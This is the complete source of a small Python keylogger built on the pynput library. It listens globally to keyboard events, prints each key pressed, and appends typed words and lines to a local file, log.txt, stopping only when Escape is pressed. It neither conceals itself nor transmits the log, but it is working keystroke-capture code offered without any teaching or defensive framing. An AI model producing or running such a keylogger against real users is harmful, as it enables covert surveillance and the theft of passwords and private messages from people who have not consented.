import pynput
from pynput.keyboard import Key, Listener

charCount = 0
keys = []

def onKeyPress(key):
    try: 
        print('Key Pressed : ',key)  
    except Exception as ex:
        print('There was an error : ',ex)

def onKeyRelease(key):
    global keys, charCount
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            writeToFile(keys)
            charCount = 0
            keys = []
        elif key == Key.space:
            key = ' '
            writeToFile(keys)
            keys = []
            charCount = 0
        keys.append(key)
        charCount += 1

def writeToFile(keys):
    with open('log.txt','a') as file:
        for key in keys:
            key = str(key).replace("'","")
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")

with Listener(on_press=onKeyPress,on_release=onKeyRelease) as listener:
    listener.join()
